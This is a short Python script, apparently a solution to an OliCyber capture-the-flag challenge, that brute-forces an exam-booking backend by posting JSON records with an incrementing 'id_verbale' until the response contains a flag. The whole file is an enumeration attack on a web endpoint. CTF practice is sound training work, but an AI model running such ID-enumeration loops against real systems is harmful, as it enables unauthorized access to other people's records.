import requests

s = requests.Session()
url = 'http://exambooking.challs.olicyber.it/bakand'
r = s.get(url)
i = 525
while True:
    print("Retrying...")
    print(r.text)
    #cookies = dict(session_id=str(i))
    data = {
        "id_verbale" : i,
        "cod_ins": "01ELEET",
        "d_init_appel": "",
        "d_fin_appel": "",
        "data_appello": "2021-07-05",
        "frequenza": 2021,
        "nome_insegnamente":"Hacktivism",
        "docente": "ROBOT MR",
        "data_ora_appello":"05-07-2021 17:00",
        "desc_tipo":"Esami scritti a risposta aperta o chiusa tramite PC",
        "note":"Please be advised that to take the test you need your credential for the PORTALE DELLA DIDATTICA. In the REMOTE EXAMS part you will find the link to the test. At the begging of the test, following respondus instructions, you must show a valid photo ID to the webcam in such a way that it can be read.",
        "mat_docente": "30120",
        "aula": 999,
        "posti_liberi": "S"
    }


    r = s.post(url, json=data)
    print("Trying: " + str(i) + "..")
    i += 1
    if "flag" in r.text:
        print(r.text)
        exit()
